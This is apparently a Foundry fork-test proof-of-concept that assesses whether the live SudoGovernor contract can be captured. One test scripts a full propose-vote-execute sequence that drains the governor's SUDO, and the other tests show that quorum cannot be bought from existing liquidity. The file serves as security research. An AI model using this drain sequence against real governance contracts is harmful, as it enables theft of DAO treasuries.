// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20, IUniV2Pair, ISudoGovernor} from "../src/Interfaces.sol";

/// @title SudoGovernor (0x6853f8865BA8e9FBd9C8CCE3155ce5023fB7EEB0) — capture-feasibility PoC
/// @notice READ-ONLY / FORK-ONLY. No mainnet transactions are ever sent.
///   TEST A: proves the no-timelock, instant-execute governance mechanism works
///           (a hypothetical attacker who ALREADY holds the quorum can drain the
///            governor's 14.89M SUDO in one vote).
///   TEST B: proves an unprivileged attacker CANNOT acquire the 2,400,000 SUDO
///           quorum from live DEX liquidity (decisive negative).
///   TEST C: quantifies the prize if capture were possible (dump into ~$35k of
///           liquidity) — tiny.
///   TEST D: end-to-end negative — an attacker holding 100% of all on-chain
///           SUDO liquidity still cannot pass a proposal.
contract SudoGovernorTest is Test {
    address constant GOV = 0x6853f8865BA8e9FBd9C8CCE3155ce5023fB7EEB0;
    address constant SUDO = 0x3446Dd70B2D52A6Bf4a5a192D9b0A161295aB7F9;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Live SUDO venues (verified 2026-10-25)
    address constant UNIV2 = 0x1533F61FAcb7cc3A632B12ea9f55D3FBb57309E0; // SUDO/WETH
    address constant UNIV3_1PCT = 0x68d01EfdFbe5C0eeBE3b19B571B18Ae6D6EE16FC; // SUDO/WETH 1%
    address constant UNIV3_03PCT = 0x1aB172cb7eC893Eb990BfeE8f83B49d69Aa6A6CC; // SUDO/WETH 0.3%
    address constant UNIV3_SUDO_USDC = 0xDF709525C5880322422A10E045C1E0fA82cDa1B2; // SUDO/USDC 1%
    address constant UNIV3_SUDO_XMON = 0x9E4908114C5e8b23F828C8De965932EC10f2E9D3; // SUDO/XMON 1%

    uint256 constant QUORUM = 2_400_000e18;
    uint256 constant THRESHOLD = 300_000e18;
    uint256 constant ETH_PRICE_USD = 2353.68e18; // DefiLlama 2026-10-25

    ISudoGovernor gov = ISudoGovernor(GOV);
    IERC20 sudo = IERC20(SUDO);

    address attacker = address(0xA11CE);

    function setUp() public {
        string memory rpc = vm.envOr(
            "FORK_RPC_URL",
            vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))
        );
        uint256 pin = vm.envOr("PIN_BLOCK", uint256(0));
        if (pin != 0) {
            try vm.createSelectFork(rpc, pin) {} catch {
                vm.createSelectFork(rpc);
            }
        } else {
            vm.createSelectFork(rpc);
        }
    }

    // ------------------------------------------------------------------ //
    // TEST A — the mechanism is real: no timelock, no guardian, instant    //
    // execution after the voting window.                                   //
    // ------------------------------------------------------------------ //
    function test_A_mechanism_noTimelock_instantDrain() public {
        uint256 govSudo = sudo.balanceOf(GOV);
        console2.log("fork block            :", block.number);
        console2.log("governor SUDO balance :", govSudo);
        require(govSudo > 14_000_000e18, "gov should hold ~14.89M SUDO");

        // No timelock / no guardian exposed:
        (bool okT,) = GOV.staticcall(abi.encodeWithSignature("timelock()"));
        (bool okG,) = GOV.staticcall(abi.encodeWithSignature("guardian()"));
        assertFalse(okT, "no timelock");
        assertFalse(okG, "no guardian");

        // 1. Attacker (hypothetically) already holds the quorum and delegates.
        deal(SUDO, attacker, QUORUM);
        vm.prank(attacker);
        sudo.delegate(attacker);
        assertEq(sudo.balanceOf(attacker), QUORUM, "attacker funded with quorum");
        assertGe(QUORUM, THRESHOLD, "quorum clears threshold");
        // Move one block so the delegation checkpoint is visible at (block.number - 1),
        // which is the snapshot OZ Governor.propose() reads for the threshold check.
        vm.roll(block.number + 1);

        // 2. Build a proposal that sweeps the governor's entire SUDO balance.
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = SUDO;
        values[0] = 0;
        calldatas[0] = abi.encodeCall(IERC20.transfer, (attacker, govSudo));
        string memory desc = "P7 PoC: sweep SudoGovernor SUDO";

        uint256 snapshot = block.number + gov.votingDelay();
        vm.prank(attacker);
        uint256 proposalId = gov.propose(targets, values, calldatas, desc);
        assertEq(uint8(gov.state(proposalId)), 0, "Pending");

        // 3. Voting window (block-number clock).
        vm.roll(snapshot + 1);
        assertEq(uint8(gov.state(proposalId)), 1, "Active");
        vm.prank(attacker);
        gov.castVote(proposalId, 1); // support = For

        // 4. After the voting period the proposal is Succeeded — no timelock step.
        vm.roll(snapshot + gov.votingPeriod() + 1);
        assertEq(uint8(gov.state(proposalId)), 4, "Succeeded");

        uint256 before = sudo.balanceOf(attacker);
        // 5. Permissionless execute: anyone can push the already-passed proposal.
        vm.prank(address(0xBEEF));
        gov.execute(targets, values, calldatas, keccak256(bytes(desc)));

        assertEq(uint8(gov.state(proposalId)), 7, "Executed");
        assertEq(sudo.balanceOf(attacker) - before, govSudo, "attacker swept governor SUDO");
        assertEq(sudo.balanceOf(GOV), 0, "governor drained");
        console2.log("TEST A: instant drain of SUDO succeeded (mechanism CONFIRMED)");
    }

    // ------------------------------------------------------------------ //
    // TEST B — decisive negative: max SUDO an unprivileged attacker can    //
    // acquire from every live venue is far below the 2.4M quorum.          //
    // ------------------------------------------------------------------ //
    function test_B_maxAcquirable_farBelowQuorum() public {
        (uint256 v2Sudo,) = _v2Reserves(UNIV2);
        uint256 v3Sudo = sudo.balanceOf(UNIV3_1PCT);
        uint256 v3bSudo = sudo.balanceOf(UNIV3_03PCT);
        uint256 usdcSudo = sudo.balanceOf(UNIV3_SUDO_USDC);
        uint256 xmonSudo = sudo.balanceOf(UNIV3_SUDO_XMON);

        uint256 total = v2Sudo + v3Sudo + v3bSudo + usdcSudo + xmonSudo;

        console2.log("fork block                     :", block.number);
        console2.log("UniV2 SUDO reserve             :", v2Sudo);
        console2.log("UniV3 1% SUDO balance          :", v3Sudo);
        console2.log("UniV3 0.3% SUDO balance        :", v3bSudo);
        console2.log("UniV3 SUDO/USDC SUDO balance   :", usdcSudo);
        console2.log("UniV3 SUDO/XMON SUDO balance   :", xmonSudo);
        console2.log("MAX acquirable SUDO (upper bnd):", total);
        console2.log("quorum                         :", QUORUM);

        // Absolute upper bound: even owning 100% of every SUDO pool < quorum.
        assertLt(total, QUORUM, "max acquirable must be < quorum");
        // And it is not even close to the 300k proposal threshold * 8.
        assertLt(total * 100 / QUORUM, 40, "acquirable < 40% of quorum");
    }

    // ------------------------------------------------------------------ //
    // TEST C — economics: dumping the governor's 14.89M SUDO into the live //
    // pools recovers only a few thousand USD (the prize is illiquid).      //
    // ------------------------------------------------------------------ //
    function test_C_prize_isIlliquid() public {
        (uint256 x, uint256 y) = _v2Reserves(UNIV2); // x=SUDO, y=WETH
        uint256 govSudo = sudo.balanceOf(GOV);
        uint256 q = govSudo;

        // constant-product: WETH out = y*q/(x+q)
        uint256 wethOut = (y * q) / (x + q);
        uint256 usd = (wethOut * ETH_PRICE_USD) / 1e18;

        // Upper bound on the whole prize: WETH held by both main pools.
        uint256 wethV2 = y;
        uint256 wethV3 = IERC20(WETH).balanceOf(UNIV3_1PCT);
        uint256 totalWethUsd = ((wethV2 + wethV3) * ETH_PRICE_USD) / 1e18;

        console2.log("V2 SUDO reserve :", x);
        console2.log("V2 WETH reserve :", y);
        console2.log("gov SUDO to dump:", q);
        console2.log("WETH out (V2)   :", wethOut);
        console2.log("USD out (V2)    :", usd);
        console2.log("ALL WETH in both pools USD (hard ceiling):", totalWethUsd);

        assertLt(usd, 15_000e18, "V2 dump yield must be small");
        assertLt(totalWethUsd, 15_000e18, "total prize ceiling must be small");
    }

    // ------------------------------------------------------------------ //
    // TEST D — end-to-end negative: an attacker holding the ENTIRE on-chain //
    // SUDO supply in DEX pools still cannot reach quorum -> Defeated.       //
    // ------------------------------------------------------------------ //
    function test_D_attackerWithAllLiquidity_isDefeated() public {
        uint256 maxAcq = sudo.balanceOf(UNIV2) + sudo.balanceOf(UNIV3_1PCT)
            + sudo.balanceOf(UNIV3_03PCT) + sudo.balanceOf(UNIV3_SUDO_USDC)
            + sudo.balanceOf(UNIV3_SUDO_XMON);
        // Add the exact V2 reserve (balanceOf(pair) == reserve for a UniV2 pair).
        // Already covered above, so maxAcq is the true all-pools upper bound.

        deal(SUDO, attacker, maxAcq);
        vm.prank(attacker);
        sudo.delegate(attacker);
        vm.roll(block.number + 1); // make delegation visible at (block.number - 1)

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = SUDO;
        values[0] = 0;
        calldatas[0] = abi.encodeCall(IERC20.transfer, (attacker, sudo.balanceOf(GOV)));
        string memory desc = "P7 PoC: drain with all acquirable SUDO";

        // Threshold is clear (maxAcq > 300k), so proposing works...
        vm.prank(attacker);
        uint256 proposalId = gov.propose(targets, values, calldatas, desc);

        uint256 snapshot = block.number + gov.votingDelay();
        vm.roll(snapshot + 1);
        vm.prank(attacker);
        gov.castVote(proposalId, 1);

        vm.roll(snapshot + gov.votingPeriod() + 1);
        // ...but the proposal is Defeated because quorum (2.4M) was never reached.
        assertEq(uint8(gov.state(proposalId)), 3, "must be Defeated (no quorum)");
        vm.expectRevert();
        vm.prank(attacker);
        gov.execute(targets, values, calldatas, keccak256(bytes(desc)));
        console2.log("TEST D: attacker with ALL on-chain SUDO liquidity is DEFEATED");
        console2.log("maxAcq :", maxAcq);
        console2.log("quorum :", QUORUM);
    }

    // ----------------------------- helpers ---------------------------- //
    function _v2Reserves(address pair) internal view returns (uint256 sudoR, uint256 wethR) {
        (uint112 r0, uint112 r1,) = IUniV2Pair(pair).getReserves();
        if (IUniV2Pair(pair).token0() == SUDO) {
            (sudoR, wethR) = (uint256(r0), uint256(r1));
        } else {
            (wethR, sudoR) = (uint256(r0), uint256(r1));
        }
    }
}
